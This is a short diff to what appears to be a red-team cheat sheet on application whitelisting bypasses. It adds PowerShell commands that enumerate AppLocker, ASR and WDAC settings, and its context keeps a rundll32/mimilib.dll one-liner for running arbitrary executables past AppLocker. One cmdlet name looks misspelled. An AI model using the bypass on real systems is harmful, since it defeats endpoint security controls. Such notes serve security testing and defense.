@@ -1,4 +1,11 @@
 # Application Whitelisting Bypasses
+## Enumeration
+Check Applocker policies:
+`Get-AppLockerPolicies -Effective`    
+ASR Rules:   
+`Get-MpPreference | select AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Action`   
+WDAC:   
+`Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | FL codeintegrity`   
 ## Random ones...
 - Bypass Applocker with mimilib.dll to run arbitrary executables:  
   `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
